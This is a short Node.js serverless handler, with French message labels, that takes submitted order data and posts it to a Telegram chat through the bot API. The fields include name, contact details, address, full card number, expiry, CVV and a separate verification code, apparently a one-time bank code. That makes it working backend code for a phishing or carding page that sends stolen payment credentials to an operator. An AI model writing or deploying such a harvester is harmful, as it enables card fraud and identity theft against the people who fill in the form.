const fetch = require('node-fetch');

exports.handler = async function(event, context) {
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = process.env;
  const data = JSON.parse(event.body);

  const message = `
    Nouvelle commande :
    Panier :
    - ${data.cart.join('\n- ')}
    Informations personnelles :
    Nom : ${data.personalInfo.name}
    Email : ${data.personalInfo.email}
    Téléphone : ${data.personalInfo.phone}
    Pays : ${data.personalInfo.country}
    Ville : ${data.personalInfo.city}
    Code postal : ${data.personalInfo.postalCode}
    Informations de livraison :
    Adresse : ${data.shippingInfo.address}
    Contact : ${data.shippingInfo.contact}
    Informations bancaires :
    Carte : ${data.paymentInfo.cardNumber} (${data.paymentInfo.cardHolder})
    Expire : ${data.paymentInfo.expiryDate}
    CVV : ${data.paymentInfo.cvv}
    Code de vérification : ${data.verificationCode}
  `;

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const params = {
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
  };

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(params),
    });
    const result = await response.json();

    if (result.ok) {
      return {
        statusCode: 200,
        body: JSON.stringify({ message: 'Message sent to Telegram', redirect: true }),
      };
    } else {
      return {
        statusCode: 500,
        body: JSON.stringify({ error: 'Failed to send message to Telegram' }),
      };
    }
  } catch (error) {
    return {
      statusCode: 500,
      body: JSON.stringify({ error: error.message }),
    };
  }
};